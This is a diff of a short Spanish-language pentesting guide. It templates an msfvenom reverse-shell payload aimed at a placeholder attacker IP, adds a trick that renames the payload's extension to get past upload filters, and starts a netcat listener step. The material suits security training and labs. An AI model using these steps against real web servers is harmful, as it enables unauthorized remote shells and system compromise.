@@ -4,11 +4,17 @@
 # 3.Crear un Payload para subir
 
 ```bash
-msfvenom -p php/reverse_php LHOST=<"IP Atancante"> LPORT=<"Puerto de conexion a la maquina atacante"> -f raw > pwned.php
+msfvenom -p <"Payload con Reverse Shell"> LHOST=<"IP Atancante"> LPORT=<"Puerto de conexion a la maquina atacante"> -f <"Formato de Archivo"> > pwned.<"Extension del Payload">
 ```
 
 # 4.Subir el Payload
+## Bypass Extensión Restriction
 
+Cuando el servidor web no permita subir archivos con una extensión, utilizaremos un archivo con otra extensión.
+
+```bash
+mv pwned.<"Extension Invalida"> pwned.<"Extension valida">
+```
 # 5.Poner la máquina a la escucha
 ## Netcat
 ```bash
